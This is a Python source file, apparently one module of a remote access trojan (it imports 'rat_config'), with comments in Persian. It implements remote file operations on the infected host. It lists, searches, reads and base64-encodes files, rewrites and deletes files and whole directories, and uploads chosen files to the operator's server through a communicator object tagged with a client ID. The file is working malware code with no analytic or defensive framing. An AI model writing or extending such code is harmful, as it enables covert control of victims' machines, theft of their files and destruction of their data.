import os
import logging
from datetime import datetime
import base64
from rat_config import Config
from datetime import datetime
import shutil

class FileManager:
    def __init__(self, encryption, communicator):
        if not Config.ENABLE_FILE_MANAGEMENT:
            logging.info("FileManager disabled in config")
            return
            
        self.encryption = encryption
        self.communicator = communicator
        if Config.DEBUG_MODE:
            logging.info("FileManager initialized")

    def list_files(self, path):
        """لیست فایل‌ها و دایرکتوری‌ها"""
        if not Config.ENABLE_FILE_MANAGEMENT:
            return {"error": "File management disabled"}

        try:
            if not os.path.exists(path):
                return {"error": f"Path not found: {path}"}
            
            # بررسی مسیرهای محدود شده
            restricted_paths = ['C:\\Windows', 'C:\\Program Files', 'C:\\Program Files (x86)']
            for restricted in restricted_paths:
                if path.lower().startswith(restricted.lower()):
                    return {"error": f"Access to restricted path denied: {path}"}
            
            result = []
            for entry in os.listdir(path):
                full_path = os.path.join(path, entry)
                try:
                    stats = os.stat(full_path)
                    result.append({
                        "name": entry,
                        "path": full_path,
                        "is_dir": os.path.isdir(full_path),
                        "size": stats.st_size,
                        "modified": datetime.fromtimestamp(stats.st_mtime).isoformat(),
                        "created": datetime.fromtimestamp(stats.st_ctime).isoformat()
                    })
                except (OSError, PermissionError):
                    # رد کردن فایل‌هایی که دسترسی نداریم
                    continue
            
            if Config.DEBUG_MODE:
                logging.info(f"Listed files in {path}: {len(result)} entries")
            return {"files": result, "count": len(result)}
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error listing files in {path}: {str(e)}")
            return {"error": str(e)}

    def read_file(self, file_path):
        """خواندن محتوای فایل"""
        if not Config.ENABLE_FILE_MANAGEMENT:
            return {"error": "File management disabled"}

        try:
            if not os.path.exists(file_path):
                return {"error": f"File not found: {file_path}"}
            if not os.path.isfile(file_path):
                return {"error": f"Not a file: {file_path}"}
            
            # بررسی سایز فایل
            file_size = os.path.getsize(file_path)
            if file_size > Config.MAX_FILE_UPLOAD_SIZE:
                return {"error": f"File too large: {file_size} bytes (max: {Config.MAX_FILE_UPLOAD_SIZE})"}
            
            # بررسی پسوند فایل
            file_ext = os.path.splitext(file_path)[1].lower().lstrip('.')
            if file_ext not in Config.ALLOWED_FILE_EXTENSIONS and Config.ALLOWED_FILE_EXTENSIONS != ['*']:
                return {"error": f"File extension not allowed: {file_ext}"}
            
            with open(file_path, 'rb') as f:
                content = f.read()
            
            encoded_content = base64.b64encode(content).decode('utf-8')
            
            if Config.DEBUG_MODE:
                logging.info(f"Read file: {file_path}, size: {len(content)} bytes")
            
            return {
                "filename": os.path.basename(file_path),
                "content": encoded_content,
                "size": len(content),
                "path": file_path
            }
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error reading file {file_path}: {str(e)}")
            return {"error": str(e)}

    def download_file(self, file_path):
        """دانلود فایل و ارسال به سرور"""
        if not Config.ENABLE_FILE_MANAGEMENT:
            return {"error": "File management disabled"}

        try:
            if not os.path.exists(file_path):
                return {"error": f"File not found: {file_path}"}
            if not os.path.isfile(file_path):
                return {"error": f"Not a file: {file_path}"}
            
            # بررسی سایز فایل
            file_size = os.path.getsize(file_path)
            if file_size > Config.MAX_FILE_UPLOAD_SIZE:
                return {"error": f"File too large: {file_size} bytes (max: {Config.MAX_FILE_UPLOAD_SIZE})"}
            
            with open(file_path, 'rb') as f:
                content = f.read()
            
            response = self.communicator.upload_file({
                "filename": os.path.basename(file_path),
                "client_id": self.communicator.client_id,
                "content": content,
                "timestamp": datetime.now().isoformat(),
                "size": file_size
            })
            
            if Config.DEBUG_MODE:
                logging.info(f"Downloaded file {file_path} to server")
            
            return {"status": "success", "response": response, "size": file_size}
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error downloading file {file_path}: {str(e)}")
            return {"error": str(e)}

    def edit_file(self, file_path, new_content):
        """ویرایش محتوای فایل"""
        if not Config.ENABLE_FILE_MANAGEMENT:
            return {"error": "File management disabled"}

        try:
            if not os.path.exists(file_path):
                return {"error": f"File not found: {file_path}"}
            if not os.path.isfile(file_path):
                return {"error": f"Not a file: {file_path}"}
            
            # بررسی مسیرهای محدود شده
            restricted_paths = ['C:\\Windows', 'C:\\Program Files', 'C:\\Program Files (x86)']
            for restricted in restricted_paths:
                if file_path.lower().startswith(restricted.lower()):
                    return {"error": f"Access to restricted path denied: {file_path}"}
            
            # رمزگشایی محتوای Base64 اگر ارائه شده
            try:
                decoded_content = base64.b64decode(new_content).decode('utf-8')
            except Exception:
                decoded_content = new_content  # فرض متن ساده اگر Base64 نباشد
            
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(decoded_content)
            
            if Config.DEBUG_MODE:
                logging.info(f"Edited file: {file_path}")
            
            return {"status": "success", "file_path": file_path}
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error editing file {file_path}: {str(e)}")
            return {"error": str(e)}

    def delete_file(self, file_path):
        """حذف فایل یا دایرکتوری"""
        if not Config.ENABLE_FILE_MANAGEMENT:
            return {"error": "File management disabled"}

        try:
            if not os.path.exists(file_path):
                return {"error": f"Path not found: {file_path}"}
            
            # بررسی مسیرهای محدود شده
            restricted_paths = ['C:\\Windows', 'C:\\Program Files', 'C:\\Program Files (x86)', 'C:\\System32']
            for restricted in restricted_paths:
                if file_path.lower().startswith(restricted.lower()):
                    return {"error": f"Access to restricted path denied: {file_path}"}
            
            if os.path.isfile(file_path):
                os.remove(file_path)
                if Config.DEBUG_MODE:
                    logging.info(f"Deleted file: {file_path}")
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
                if Config.DEBUG_MODE:
                    logging.info(f"Deleted directory: {file_path}")
            
            return {"status": "success", "path": file_path}
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error deleting {file_path}: {str(e)}")
            return {"error": str(e)}

    def create_directory(self, path):
        """ایجاد دایرکتوری جدید"""
        if not Config.ENABLE_FILE_MANAGEMENT:
            return {"error": "File management disabled"}

        try:
            os.makedirs(path, exist_ok=True)
            if Config.DEBUG_MODE:
                logging.info(f"Created directory: {path}")
            return {"status": "success", "path": path}
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error creating directory {path}: {str(e)}")
            return {"error": str(e)}

    def get_file_info(self, file_path):
        """دریافت اطلاعات فایل"""
        if not Config.ENABLE_FILE_MANAGEMENT:
            return {"error": "File management disabled"}

        try:
            if not os.path.exists(file_path):
                return {"error": f"File not found: {file_path}"}
            
            stats = os.stat(file_path)
            return {
                "filename": os.path.basename(file_path),
                "path": file_path,
                "size": stats.st_size,
                "modified": datetime.fromtimestamp(stats.st_mtime).isoformat(),
                "created": datetime.fromtimestamp(stats.st_ctime).isoformat(),
                "is_dir": os.path.isdir(file_path),
                "is_file": os.path.isfile(file_path)
            }
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error getting file info for {file_path}: {str(e)}")
            return {"error": str(e)}

    def search_files(self, directory, pattern):
        """جستجوی فایل‌ها بر اساس الگو"""
        if not Config.ENABLE_FILE_MANAGEMENT:
            return {"error": "File management disabled"}

        try:
            if not os.path.exists(directory):
                return {"error": f"Directory not found: {directory}"}
            
            results = []
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if pattern.lower() in file.lower():
                        full_path = os.path.join(root, file)
                        try:
                            stats = os.stat(full_path)
                            results.append({
                                "name": file,
                                "path": full_path,
                                "size": stats.st_size,
                                "modified": datetime.fromtimestamp(stats.st_mtime).isoformat()
                            })
                        except (OSError, PermissionError):
                            continue
                
                # محدود کردن نتایج برای جلوگیری از overload
                if len(results) >= 100:
                    break
            
            return {"files": results, "count": len(results)}
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error searching files in {directory}: {str(e)}")
            return {"error": str(e)}